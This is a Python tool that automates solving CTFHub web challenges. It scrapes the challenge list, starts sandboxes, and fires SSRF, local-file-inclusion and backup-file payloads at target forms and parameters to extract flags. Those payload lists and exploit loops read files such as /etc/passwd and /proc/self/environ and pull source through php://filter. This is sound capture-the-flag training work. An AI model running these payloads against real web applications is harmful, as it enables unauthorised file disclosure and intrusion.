#!/usr/bin/env python3
"""CTF Challenge Solving Coordinator.

Orchestrates the full solving pipeline:
    1. Gather: Scrape CTFHub challenges via CDP
    2. Analyze: Recognize vulnerability type per challenge
    3. Prioritize: Sort by difficulty, time, confidence
    4. Execute: Start sandbox, explore target, run attack
    5. Record: Submit flag, ingest solution to knowledge base

Usage:
    python -m tools.feeder.ctf_coordinator

Or from code:
    c = CTFCoordinator()
    c.run(max_challenges=3)
"""

import io
import json
import os
import re
import sys
import time
import traceback
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Dict, List, Optional, Set, Tuple

from tools.feeder.ctf_patterns import PatternDB, get_pattern_db
from tools.feeder.ctf_recognizer import (
    CTFRecognizer, CTFChallenge, RecognitionResult, get_recognizer,
)


# ── Constants ──────────────────────────────────────────────────────────────

CTFHUB_API = "https://api.ctfhub.com/User_API/"
CTFHUB_URL = "https://www.ctfhub.com/#/challenge"

# Quick SSRF payloads to try first
SSRF_QUICK_PAYLOADS = [
    "file:///flag",
    "file:///flag.txt",
    "file:///etc/passwd",
    "file:///var/www/html/flag.php",
    "http://127.0.0.1/flag.php",
    "http://127.0.0.1/config.php",
    "file:///proc/self/environ",
]

# Quick LFI payloads
LFI_QUICK_PAYLOADS = [
    "/etc/passwd",
    "/flag",
    "../../../../../../flag",
    "/var/www/html/flag.php",
    "php://filter/convert.base64-encode/resource=flag.php",
    "php://filter/convert.base64-encode/resource=index.php",
]

# Quick backup file names to scan
BACKUP_FILES = [
    ".index.php.swp", ".index.php.swo", ".index.php.bak", ".index.php~",
    "index.php.bak", "index.php.old", "index.php.swp",
    ".flag.php.swp", "flag.php.bak",
    ".git/HEAD", ".svn/entries", ".DS_Store",
    "robots.txt", "sitemap.xml",
]


# ── Execution Result ───────────────────────────────────────────────────────

@dataclass
class SolveResult:
    """Result of attempting to solve one challenge."""
    challenge: CTFChallenge
    recognition: RecognitionResult
    flag: Optional[str] = None
    solved: bool = False
    error: Optional[str] = None
    target_url: str = ""
    exploration_data: Dict[str, Any] = field(default_factory=dict)
    elapsed_seconds: float = 0.0


# ── Coordinator ────────────────────────────────────────────────────────────

class CTFCoordinator:
    """Orchestrates the full CTF solving pipeline."""

    def __init__(self, kb_root: str = None):
        self.kb_root = kb_root or os.path.join(
            os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
            "knowledge")
        self.pattern_db = get_pattern_db()
        self.recognizer = get_recognizer(self.kb_root)
        self.results: List[SolveResult] = []
        self._spa = None  # Lazy-loaded SpaCrawler

    @property
    def spa(self):
        """Lazy-init SpaCrawler for CDP communication."""
        if self._spa is None:
            sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
            from tools.feeder.spa_crawler import SpaCrawler
            self._spa = SpaCrawler()
            self._spa.connect('ctfhub')
        return self._spa

    # ── Phase 1: Gather Challenges ──────────────────────────────────────

    def fetch_challenges(self) -> List[Dict]:
        """Fetch challenge list from CTFHub API via CDP.

        Uses SpaCrawler.intercept_api to capture Challenge/getAll response.
        """
        print("[Gather] Fetching challenges from CTFHub...")

        try:
            # Navigate to challenge page to trigger API calls
            self.spa._send('Page.navigate', {'url': CTFHUB_URL})
            time.sleep(4)
            while self.spa._recv_any(0.3):
                pass

            # Wait for SPA to render
            for i in range(8):
                body = self.spa.evaluate(
                    'document.body ? document.body.textContent.substring(0, 200) : "no body"')
                if "We're sorry" not in str(body) and "no body" not in str(body):
                    break
                time.sleep(2)
                while self.spa._recv_any(0.3):
                    pass

            # Capture Challenge/getAll API response
            captured = {}
            body_requests = {}
            deadline = time.time() + 12

            while time.time() < deadline:
                msg = self.spa._recv_any(0.5)
                if msg is None:
                    continue
                mid = msg.get('id')
                method = msg.get('method', '')
                if mid and mid in body_requests:
                    body = msg.get('result', {}).get('body', '')
                    if body:
                        captured[body_requests.pop(mid)] = body
                    continue
                if method == 'Network.responseReceived':
                    url = msg['params']['response']['url']
                    if 'api.ctfhub.com' in url:
                        rid = msg['params']['requestId']
                        self.spa._msg_id += 1
                        bmid = self.spa._msg_id
                        short = url.split('User_API/')[-1].split('?')[0]
                        body_requests[bmid] = short
                        self.spa._send('Network.getResponseBody',
                                       {'requestId': rid}, msg_id=bmid)

            if 'Challenge/getAll' in captured:
                data = json.loads(captured['Challenge/getAll'])
                challenges = data.get('data', {}).get('list', [])
                print("[Gather] Got %d challenges" % len(challenges))
                return challenges
            else:
                print("[Gather] Failed to capture Challenge/getAll API")
                return []

        except Exception as e:
            print("[Gather] Error: %s" % e)
            traceback.print_exc()
            return []

    def start_sandbox(self, challenge_data: Dict) -> Optional[str]:
        """Start a sandbox for a challenge and return the target URL."""
        try:
            # Click the challenge card in browser
            title = challenge_data.get('title', '')
            click_js = (
                'var cards=document.querySelectorAll(".ant-card-hoverable");'
                'var r="not found";'
                'for(var i=0;i<cards.length;i++){'
                '  if(cards[i].textContent.indexOf("%s")>=0){cards[i].click();r="clicked";break;}'
                '}'
                'r'
            ) % title
            result = self.spa.evaluate(click_js)
            if 'not found' in str(result):
                return None

            time.sleep(2)
            while self.spa._recv_any(0.3):
                pass

            # Find start button
            start_js = (
                'var btns=document.querySelectorAll(".ant-modal button");'
                'var r="no start";'
                'for(var i=0;i<btns.length;i++){'
                '  var t=btns[i].textContent.trim();'
                '  if(t.indexOf("50")>=0||t.indexOf("开启")>=0||t.indexOf("启动")>=0||'
                '     t.indexOf("环境")>=0&&t.indexOf("续期")<0){'
                '    btns[i].click();r="clicked: "+t;break;'
                '  }'
                '}'
                'r'
            )
            start_result = self.spa.evaluate(start_js)
            print("[Sandbox] Start button: %s" % start_result)

            # Wait for sandbox to be ready, capture the target URL
            for i in range(10):
                time.sleep(2)
                while self.spa._recv_any(0.3):
                    pass
                modal = self.spa.evaluate(
                    'var m=document.querySelector(".ant-modal");'
                    'm ? m.textContent : "NO_MODAL"')
                urls = re.findall(r'https?://[^\s\x00-\x1f]+', str(modal))
                # Filter to sandbox URLs
                for url in urls:
                    if 'sandbox' in url and 'ctfhub' in url:
                        print("[Sandbox] Target: %s" % url)
                        return url
                if i == 5:
                    # Print modal fragment for debugging
                    print("[Sandbox] Modal preview: %s" % str(modal)[:200])

            return None
        except Exception as e:
            print("[Sandbox] Error: %s" % e)
            return None

    # ── Phase 2: Analyze ────────────────────────────────────────────────

    def analyze_challenges(self, raw_challenges: List[Dict]) -> List[CTFChallenge]:
        """Convert raw API data to CTFChallenge objects with recognition."""
        challenges = []
        for raw in raw_challenges:
            # Extract tags from category array
            tags = [c.get('title', '') for c in raw.get('category', [])]

            c = CTFChallenge(
                challenge_id=raw.get('id', 0),
                title=raw.get('title', 'Unknown'),
                description=raw.get('description', ''),
                tags=tags,
                level=raw.get('level', 0.0),
                solve_count=raw.get('finish_count', 0),
                extra={
                    'task_id': raw.get('task_id'),
                    'state': raw.get('state'),
                    'refer': raw.get('refer', ''),
                }
            )
            challenges.append(c)
        return challenges

    # ── Phase 3: Prioritize ─────────────────────────────────────────────

    def prioritize(self, challenges: List[CTFChallenge],
                   skip_solved: bool = True,
                   max_level: float = 9.0) -> List[Tuple[CTFChallenge, RecognitionResult]]:
        """Recognize and sort challenges by solve priority."""
        results = []
        for c in challenges:
            # Skip already solved
            if skip_solved and c.extra.get('state') == 0:
                continue
            # Skip too hard
            if c.level > max_level:
                continue
            r = self.recognizer.recognize(c)
            results.append((c, r))

        # Sort by priority
        difficulty_order = {"easy": 0, "medium": 1, "hard": 2}
        time_order = {"fast (<5min)": 0, "medium (5-30min)": 1, "slow (>30min)": 2}

        def key(item):
            _, r = item
            return (
                difficulty_order.get(r.estimated_difficulty, 3),
                time_order.get(r.estimated_time, 3),
                -(r.top_match_score if r.top_match else 0),
            )

        results.sort(key=key)
        return results

    # ── Phase 4: Explore Target ────────────────────────────────────────

    def explore_target(self, target_url: str, recognition: RecognitionResult
                       ) -> Dict[str, Any]:
        """Quick exploration of target URL to gather data for solving."""
        import requests

        data = {"endpoints": [], "interesting": [], "source_leaks": []}

        try:
            # Test main page
            r = requests.get(target_url, timeout=10, allow_redirects=True)
            data['main_page_size'] = len(r.text)
            data['main_page_title'] = re.search(r'<title>(.*?)</title>', r.text, re.I)
            if data['main_page_title']:
                data['main_page_title'] = data['main_page_title'].group(1)

            # Quick SSRF test if applicable
            if any(p.subcategory == "SSRF" for p, _ in recognition.patterns[:3]):
                data['ssrf_tests'] = {}
                # Find forms
                forms = re.findall(r'<form[^>]*action="([^"]*)"', r.text, re.I)
                data['forms'] = forms

                for form_action in forms:
                    if form_action and not form_action.startswith('http'):
                        form_url = target_url.rstrip('/') + '/' + form_action.lstrip('/')
                    else:
                        form_url = form_action or target_url

                    for payload in SSRF_QUICK_PAYLOADS[:5]:
                        try:
                            rr = requests.post(form_url,
                                              data={'host': payload, 'url': payload},
                                              timeout=5)
                            if len(rr.text) > 100 and 'ctfhub' in rr.text.lower():
                                data['ssrf_tests'][payload] = "FLAG FOUND! (%dB)" % len(rr.text)
                                data['interesting'].append(("SSRF_FLAG", payload, rr.text[:500]))
                            elif len(rr.text) > 50:
                                data['ssrf_tests'][payload] = "%dB response" % len(rr.text)
                        except Exception:
                            pass

            # Quick backup file scan
            if any(p.subcategory == "备份文件泄露" for p, _ in recognition.patterns[:3]):
                data['backup_tests'] = {}
                for fname in BACKUP_FILES[:8]:
                    try:
                        rr = requests.get("%s/%s" % (target_url.rstrip('/'), fname), timeout=5)
                        if rr.status_code == 200 and len(rr.text) > 10:
                            data['backup_tests'][fname] = "%dB found" % len(rr.text)
                            data['interesting'].append(("BACKUP_FILE", fname, rr.text[:300]))
                    except Exception:
                        pass

            # Quick LFI test
            if any(p.subcategory == "文件包含" for p, _ in recognition.patterns[:3]):
                data['lfi_tests'] = {}
                for payload in LFI_QUICK_PAYLOADS[:5]:
                    for param in ['file', 'page', 'include', 'path']:
                        try:
                            rr = requests.get(target_url, params={param: payload}, timeout=5)
                            if 'root:' in rr.text:
                                data['lfi_tests']["%s=%s" % (param, payload)] = "PASSWD LEAKED!"
                                data['interesting'].append(("LFI_PASSWD", param, payload))
                        except Exception:
                            pass

            # Store list of all discovered links/endpoints
            hrefs = re.findall(r'href="([^"]*\.php[^"]*)"', r.text, re.I)
            actions = re.findall(r'action="([^"]*\.php[^"]*)"', r.text, re.I)
            srcs = re.findall(r'src="([^"]*\.php[^"]*)"', r.text, re.I)
            data['endpoints'] = list(set(hrefs + actions + srcs))

        except Exception as e:
            data['error'] = str(e)

        return data

    # ── Phase 5: Solve ──────────────────────────────────────────────────

    def try_solve(self, challenge: CTFChallenge,
                  recognition: RecognitionResult,
                  target_url: str = None) -> SolveResult:
        """Attempt to solve a challenge."""
        start_time = time.time()
        result = SolveResult(
            challenge=challenge,
            recognition=recognition,
            target_url=target_url or "",
        )

        print("\n%s" % ("=" * 60))
        print("[Solve] %s (level %.1f)" % (challenge.title, challenge.level))
        print("[Solve] Tags: %s" % ", ".join(challenge.tags))
        if recognition.top_match:
            print("[Solve] Pattern: %s (%.0f%%)" % (
                recognition.top_match.technique, recognition.top_match_score * 100))
        print("[Solve] Difficulty: %s | Time: %s" % (
            recognition.estimated_difficulty, recognition.estimated_time))

        if not target_url:
            print("[Solve] No target URL — sandbox may not be running")
            result.error = "No target URL"
            result.elapsed_seconds = time.time() - start_time
            return result

        # Explore target
        print("[Solve] Exploring target: %s" % target_url)
        exploration = self.explore_target(target_url, recognition)
        result.exploration_data = exploration

        if exploration.get('endpoints'):
            print("[Solve] Found endpoints: %s" % exploration['endpoints'])

        # Try auto-exploit based on pattern type
        flag = None

        # Check if exploration already found flag
        for item_type, item_detail, item_content in exploration.get('interesting', []):
            if item_type == "SSRF_FLAG":
                # Extract flag from SSRF response
                flag_match = re.search(r'ctfhub\{[a-f0-9]+\}', item_content)
                if flag_match:
                    flag = flag_match.group(0)
                    result.flag = flag
                    result.solved = True
                    print("[Solve] FLAG FOUND via SSRF: %s" % flag)
                    break

        if not flag and recognition.top_match:
            # Try SSRF payloads if pattern matches
            if recognition.top_match.subcategory == "SSRF":
                flag = self._auto_ssrf(target_url, exploration)
            elif recognition.top_match.subcategory == "备份文件泄露":
                flag = self._auto_backup_scan(target_url, exploration)
            elif recognition.top_match.subcategory == "文件包含":
                flag = self._auto_lfi(target_url, exploration)

        if flag and not result.solved:
            result.flag = flag
            result.solved = True
            print("[Solve] FLAG FOUND: %s" % flag)

        if not result.solved:
            print("[Solve] Auto-exploit unsuccessful — manual analysis needed")
            self._print_solve_hints(recognition, exploration)

        result.elapsed_seconds = time.time() - start_time
        return result

    def _auto_ssrf(self, target_url: str, exploration: Dict) -> Optional[str]:
        """Auto-exploit SSRF via file:// protocol."""
        import requests
        print("[Auto-SSRF] Testing file:///flag on all form endpoints...")

        forms = exploration.get('forms', [])
        endpoints = exploration.get('endpoints', [])

        # Build list of URLs to test
        test_urls = []
        for ep in forms + endpoints:
            if ep.startswith('http'):
                test_urls.append(ep)
            else:
                test_urls.append(target_url.rstrip('/') + '/' + ep.lstrip('/'))

        if not test_urls:
            test_urls.append(target_url + '/modify.php')
            test_urls.append(target_url + '/user.php')

        for test_url in set(test_urls):
            for payload in SSRF_QUICK_PAYLOADS:
                for field in ['host', 'url', 'target', 'website', 'site', 'path']:
                    try:
                        r = requests.post(test_url, data={field: payload}, timeout=5)
                        m = re.search(r'ctfhub\{[a-f0-9]+\}', r.text)
                        if m:
                            return m.group(0)
                    except Exception:
                        pass

        return None

    def _auto_backup_scan(self, target_url: str, exploration: Dict) -> Optional[str]:
        """Auto-scan for backup files and extract flags from source."""
        import requests

        # Build wordlist from known source file patterns
        base_files = ['index.php', 'flag.php', 'config.php', 'admin.php', 'user.php']
        extensions = ['.swp', '.swo', '.bak', '.old', '~', '.save', '.orig']

        for base in base_files:
            for ext in extensions:
                try:
                    url = "%s/.%s%s" % (target_url.rstrip('/'), base, ext)
                    r = requests.get(url, timeout=5)
                    if r.status_code == 200 and len(r.text) > 20:
                        m = re.search(r'ctfhub\{[a-f0-9]+\}', r.text)
                        if m:
                            return m.group(0)
                        # If source code leaked, check for flag patterns
                        if 'flag' in r.text.lower():
                            m2 = re.search(r'(?:flag|FLAG)\s*[=:]\s*["\']?(ctfhub\{[^}]+\})', r.text)
                            if m2:
                                return m2.group(1)
                except Exception:
                    pass

        return None

    def _auto_lfi(self, target_url: str, exploration: Dict) -> Optional[str]:
        """Auto-exploit LFI for flag reading."""
        import requests
        params = ['file', 'page', 'include', 'path', 'template', 'view', 'lang', 'load']

        for param in params:
            for payload in [
                '/flag',
                '/flag.txt',
                'php://filter/convert.base64-encode/resource=/flag',
                'php://filter/convert.base64-encode/resource=flag.php',
            ]:
                try:
                    r = requests.get(target_url, params={param: payload}, timeout=5)
                    m = re.search(r'ctfhub\{[a-f0-9]+\}', r.text)
                    if m:
                        return m.group(0)
                    # Check base64 encoded flag
                    import base64
                    b64_match = re.search(r'([A-Za-z0-9+/=]{20,})', r.text)
                    if b64_match:
                        try:
                            decoded = base64.b64decode(b64_match.group(1)).decode('utf-8', errors='ignore')
                            fm = re.search(r'ctfhub\{[a-f0-9]+\}', decoded)
                            if fm:
                                return fm.group(0)
                        except Exception:
                            pass
                except Exception:
                    pass

        return None

    def _print_solve_hints(self, recognition: RecognitionResult, exploration: Dict):
        """Print detailed hints for manual solving."""
        print("[Hints] ---")
        if recognition.top_match:
            print("[Hints] Attack plan:")
            for step in recognition.top_match.attack_chain:
                print("[Hints]   [%s] %s" % (step.get('phase', '?'), step.get('detail', '')))

        if exploration.get('endpoints'):
            print("[Hints] Discovered endpoints: %s" % exploration['endpoints'])
        if exploration.get('forms'):
            print("[Hints] Discovered forms: %s" % exploration['forms'])
        if exploration.get('interesting'):
            print("[Hints] Interesting findings: %s" % [
                (t, d) for t, d, _ in exploration['interesting']])

    # ── Phase 6: Submit Flag ────────────────────────────────────────────

    def submit_flag(self, challenge_title: str, flag: str) -> bool:
        """Submit a flag to CTFHub via CDP."""
        from tools.feeder.ctfhub_flag_submit import submit_flag
        ok, msg = submit_flag(challenge_title, flag)
        print("[Submit] %s -> %s: %s" % (challenge_title, ok, msg))
        return ok

    # ── Phase 7: Record ─────────────────────────────────────────────────

    def record_solution(self, result: SolveResult):
        """Record a solved challenge to the knowledge base."""
        if not result.solved:
            return

        solution_dir = os.path.join(self.kb_root, "solved", "ctfhub")
        os.makedirs(solution_dir, exist_ok=True)

        # Create solution file
        slug = re.sub(r'[^a-z0-9]+', '_', result.challenge.title.lower()).strip('_')
        if not slug:
            slug = "challenge_%d" % result.challenge.challenge_id
        filepath = os.path.join(solution_dir, "%s.md" % slug)

        # Don't overwrite existing
        if os.path.exists(filepath):
            print("[Record] Solution already exists: %s" % filepath)
            return

        content = """---
title: "%s"
challenge_id: %d
tags: [%s]
level: %.1f
solved: %s
flag: "%s"
pattern: "%s"
technique: "%s"
---

# %s

**Flag**: `%s`
**Pattern**: %s (%s)
**Tags**: %s
**Level**: %.1f
**Solved**: %s

## Attack Chain

""" % (
            result.challenge.title,
            result.challenge.challenge_id,
            ", ".join(result.challenge.tags),
            result.challenge.level,
            datetime.now().strftime("%Y-%m-%d"),
            result.flag,
            result.recognition.top_match.id if result.recognition.top_match else "unknown",
            result.recognition.top_match.technique if result.recognition.top_match else "unknown",
            result.challenge.title,
            result.flag,
            result.recognition.top_match.subcategory if result.recognition.top_match else "unknown",
            result.recognition.top_match.technique if result.recognition.top_match else "unknown",
            ", ".join(result.challenge.tags),
            result.challenge.level,
            datetime.now().strftime("%Y-%m-%d %H:%M"),
        )

        if result.recognition.top_match:
            for step in result.recognition.top_match.attack_chain:
                content += "%d. **%s**: %s\n" % (
                    len(content.split('\n')),
                    step.get('action', '?'),
                    step.get('detail', '')
                )

        content += "\n## Result\n\n"
        content += "Flag found via auto-exploitation.\n"

        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(content)
        print("[Record] Solution saved: %s" % filepath)

    # ── Main Loop ───────────────────────────────────────────────────────

    def run(self, max_challenges: int = 5, max_level: float = 9.0):
        """Run the full pipeline."""
        print("=" * 60)
        print("CTF Coordinator — %s" % datetime.now().strftime("%Y-%m-%d %H:%M"))
        print("=" * 60)

        # 1. Gather
        raw = self.fetch_challenges()
        if not raw:
            print("[ERROR] No challenges fetched — is CDP browser running?")
            return

        # 2. Analyze & Prioritize
        challenges = self.analyze_challenges(raw)
        prioritized = self.prioritize(challenges, max_level=max_level)

        print("\n[Prioritize] Top %d challenges:" % min(max_challenges, len(prioritized)))
        for i, (c, r) in enumerate(prioritized[:max_challenges]):
            top = r.top_match.technique if r.top_match else "unknown"
            print("  %d. %s (L%.1f, %d solves) → %s [%s, %s] (%.0f%%)" % (
                i + 1, c.title, c.level, c.solve_count,
                top, r.estimated_difficulty, r.estimated_time,
                r.top_match_score * 100))

        # 3. Execute
        print("\n" + "=" * 60)
        print("[Execute] Starting solving loop...")
        print("=" * 60)

        solved_count = 0
        for i, (c, r) in enumerate(prioritized[:max_challenges]):
            if solved_count >= max_challenges:
                break

            print("\n[%d/%d] %s" % (i + 1, min(max_challenges, len(prioritized)), c.title))

            # Start sandbox
            # Find matching raw challenge data
            raw_match = None
            for rc in raw:
                if rc.get('id') == c.challenge_id:
                    raw_match = rc
                    break

            if raw_match is None:
                print("  Skipping: no matching raw data for sandbox")
                continue

            target_url = self.start_sandbox(raw_match)
            if not target_url:
                print("  Skipping: could not start sandbox")
                continue

            # Solve
            result = self.try_solve(c, r, target_url)
            self.results.append(result)

            if result.solved and result.flag:
                self.submit_flag(c.title, result.flag)
                self.record_solution(result)
                solved_count += 1

        # 4. Summary
        print("\n" + "=" * 60)
        print("[Summary] %d/%d solved" % (solved_count, len(prioritized[:max_challenges])))
        for r in self.results:
            status = "SOLVED" if r.solved else "FAILED"
            print("  %s: %s (%.1fs)" % (status, r.challenge.title, r.elapsed_seconds))
        print("=" * 60)


# ── CLI ────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser(description="CTF Challenge Solving Coordinator")
    ap.add_argument("-n", "--max", type=int, default=5,
                    help="Max challenges to attempt (default: 5)")
    ap.add_argument("-l", "--max-level", type=float, default=9.0,
                    help="Max challenge level (default: 9.0)")
    ap.add_argument("--skip-fetch", action="store_true",
                    help="Skip fetching, use previously recognized challenges")
    args = ap.parse_args()

    coordinator = CTFCoordinator()
    coordinator.run(max_challenges=args.max, max_level=args.max_level)
